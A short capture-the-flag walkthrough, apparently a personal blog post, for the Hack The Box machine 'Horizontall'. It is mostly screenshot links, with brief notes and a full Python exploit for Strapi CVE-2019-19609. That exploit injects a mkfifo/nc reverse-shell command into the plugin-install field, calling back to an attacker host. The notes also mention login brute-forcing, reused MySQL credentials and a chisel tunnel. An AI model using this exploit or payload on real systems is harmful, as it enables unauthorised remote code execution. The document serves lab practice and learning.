---
title: "Horizontall (images only)"
date: 2021-08-29T18:00:00-00:00
publishdate: 2022-04-28T18:00:00-00:00
releasedate: 2021-08-28T18:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/Horizontall.png
icon: /htb-box-icons/Horizontall.png
toc: true
tags: ["Laravel"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## Introduction

This walkthrough is just a series of screenshots showing how I got through the box. 🤷‍♂ I did this box before I really worked out a process for recording my work effectively. Sorry!

If I find the time, I'll come back to this and try to document it properly. 



## Walkthrough

These are the notes I left for myself:

```
Found login page at http://api-prod.horizontall.htb/admin/auth/login

I could brute-force the login just with ffuf
Or I could try using the OpenSSH user enumeration CVE to obtain a list of users first?

The successful exploit was from https://github.com/dasithsv/CVE-2019-19609
I simply modified the port, (opened the firewall), set up a nc listener and got a shell
rhost was api-prod.horizontall.htb
lhost was 10.10.14.45
jwt was simply the jwt from my logged-in admin session (got it from firefox web dev tools)
url was http://api-prod.horizontall.htb/
```

This is the exploit I used:

```python
#!/bin/python

# Product: Strapi Framework
# Version Affected: strapi-3.0.0-beta.17.7 and earlier
# Fix PR: https://github.com/strapi/strapi/pull/4636
# NPM Advisory: https://www.npmjs.com/advisories/1424
# more information https://bittherapy.net/post/strapi-framework-remote-code-execution/

import requests
import sys

print("\n\n\nStrapi Framework Vulnerable to Remote Code Execution - CVE-2019-19609")
print("please set up a listener on port 31337 before running the script. you will get a shell to that listener\n")

if len(sys.argv) ==5:
    rhost = sys.argv[1]
    lhost = sys.argv[2]
    jwt = sys.argv[3]
    url = sys.argv[4]+'admin/plugins/install'

    headers = {
        'Host': rhost,
        'Authorization': 'Bearer '+jwt,
        'Content-Type': 'application/json',
        'Content-Length': '131',
        'Connection': 'close',
    }

    data = '{ "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+lhost+' 31337 >/tmp/f)", "port":"80" }'
    response = requests.post(url, headers=headers, data=data, verify=False)

else:
    print('python3 exploit.py <rhost> <lhost> <jwt> <url>')

```



![00-first step](00-first%20step.png)

![01-api-prod enum](01-api-prod%20enum.png)

![02-login page post](02-login%20page%20post.png)

![03-password-reset-possibly-abusable](03-password-reset-possibly-abusable.png)

![04-strapi version](04-strapi%20version.png)

![05-exploit-success](05-exploit-success.png)

![06-logged-in-dashboard](06-logged-in-dashboard.png)

![07-making a user](07-making%20a%20user.png)

![08-uploaded-php](08-uploaded-php.png)

![09-modifying reverse shell](09-modifying%20reverse%20shell.png)

![15-hints of a database](15-hints%20of%20a%20database.png)

![20-mysql credentials in developer folder](20-mysql%20credentials%20in%20developer%20folder.png)

![22-got into mysql db](22-got%20into%20mysql%20db.png)

![34-version fingerprinting laravel](34-version%20fingerprinting%20laravel.png)

![35-version fingerprinting laravel](35-version%20fingerprinting%20laravel.png)

![40-setting up chisel tunnel](40-setting%20up%20chisel%20tunnel.png)

![45-trying out the exploit](45-trying%20out%20the%20exploit.png)

![49-getting root flag easy way](49-getting%20root%20flag%20easy%20way.png)

![50-got root flag](50-got%20root%20flag.png)

![55-getting flag itself](55-getting%20flag%20itself.png)

